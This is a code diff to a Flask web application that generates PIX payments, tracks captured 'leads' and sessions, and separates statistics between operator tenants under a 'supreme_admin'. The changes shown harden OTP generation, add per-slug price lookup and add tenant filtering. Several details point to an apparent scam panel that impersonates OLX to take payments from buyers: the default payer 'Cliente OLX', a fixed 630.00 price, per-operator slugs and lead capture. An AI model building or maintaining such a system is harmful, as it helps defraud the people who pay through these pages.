@@ -890,8 +890,8 @@ _OTP_STORE: dict = {}
 _OTP_TTL = 600  # 10 minutos
 
 def _otp_generate(tg_id: int) -> str:
-    import random
-    code = str(random.randint(100000, 999999))
+    import secrets as _sec_otp
+    code = str(_sec_otp.randbelow(900000) + 100000)  # cryptographically secure
     _OTP_STORE[tg_id] = {"code": code, "expires": time.time() + _OTP_TTL, "attempts": 0}
     for k in [k for k, v in list(_OTP_STORE.items()) if v["expires"] < time.time()]:
         _OTP_STORE.pop(k, None)
@@ -1391,7 +1391,7 @@ def api_admin_stats():
     """Retorna estatÃ­sticas isoladas por admin ou globais para o Admin Supremo."""
     admin_id, role = verify_admin_access(request)
     if not admin_id:
-        return jsonify({"error": "unauthorized"}), 401
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
 
     if TG_WH_AVAILABLE:
         if role == "supreme_admin":
@@ -2099,7 +2099,22 @@ def generate_pix():
     payer_name     = sanitize_input(data.get('name', 'Cliente OLX'), 120)
     payer_document = re.sub(r'\D', '', sanitize_input(data.get('cpf', ''), 20))
     
-    price_str = admin_bot.get_config("product_price", "630.00") if BOT_AVAILABLE else "630.00"
+    # Preco: usa config do tenant correto (multi-tenant) ou fallback global
+    slug_for_price = data.get('slug', '') or request.args.get('slug', '')
+    tg_id_for_price = None
+    if TG_WH_AVAILABLE and slug_for_price:
+        try:
+            tg_id_for_price = tg_wh.get_tg_id_by_slug(slug_for_price)
+        except Exception:
+            pass
+
+    if tg_id_for_price:
+        cfgs = tg_wh.get_tenant_all_config(tg_id_for_price)
+        price_str = cfgs.get("product_price", "630.00")
+    elif BOT_AVAILABLE:
+        price_str = admin_bot.get_config("product_price", "630.00")
+    else:
+        price_str = "630.00"
     try:
         c7_amount = float(price_str.replace(",", "."))
     except ValueError:
@@ -2898,7 +2913,7 @@ def api_sessions_slug(slug):
         return jsonify({"error": "slug_not_found"}), 404
     limit = min(int(request.args.get('limit', 20)), 100)
     sessions = tg_wh.get_tg_sessions(tg_id, limit)
-    return jsonify({"sessions": sessions, "count": len(sessions)})
+    return jsonify({"ok": True, "sessions": sessions, "count": len(sessions)})
 
 
 @app.route('/tg/login')
@@ -3310,9 +3325,13 @@ def monitor_leads():
                 "ua":           data.get("ua", "")[:80],
             })
 
-        # Conversion rate using correct event type
-        total_sessions = db.execute("SELECT COUNT(*) as c FROM tg_sessions").fetchone()["c"] or 1
-        total_leads = db.execute("SELECT COUNT(*) as c FROM tg_events WHERE event_type='LEAD_CAPTURED'").fetchone()["c"]
+        # Conversion rate — filtered by tg_id for regular admins
+        if role == "supreme_admin":
+            total_sessions = db.execute("SELECT COUNT(*) as c FROM tg_sessions").fetchone()["c"] or 1
+            total_leads = db.execute("SELECT COUNT(*) as c FROM tg_events WHERE event_type='LEAD_CAPTURED'").fetchone()["c"]
+        else:
+            total_sessions = db.execute("SELECT COUNT(*) as c FROM tg_sessions WHERE tg_id=?", (tg_id,)).fetchone()["c"] or 1
+            total_leads = db.execute("SELECT COUNT(*) as c FROM tg_events WHERE tg_id=? AND event_type='LEAD_CAPTURED'", (tg_id,)).fetchone()["c"]
         conv_rate = round((total_leads / total_sessions) * 100, 1)
 
         return jsonify({
